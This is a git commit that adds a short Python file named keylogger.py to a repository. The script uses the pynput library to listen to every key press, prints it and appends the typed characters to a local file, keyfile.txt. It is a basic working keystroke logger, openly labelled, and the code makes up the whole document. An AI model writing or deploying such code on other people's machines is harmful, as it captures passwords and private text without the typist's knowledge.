3504f8f92dcf7e46ee7fe3d05309d86cb65c349b
Ashton Clark <123989861+MinionTorturer3@users.noreply.github.com>
2024-08-11 23:16:39 -0700

    Added files to repo

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+def keyPress(key):
+    print(str(key))
+    with open("keyfile.txt",'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("error getting char")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPress)
+    listener.start()
+    input()
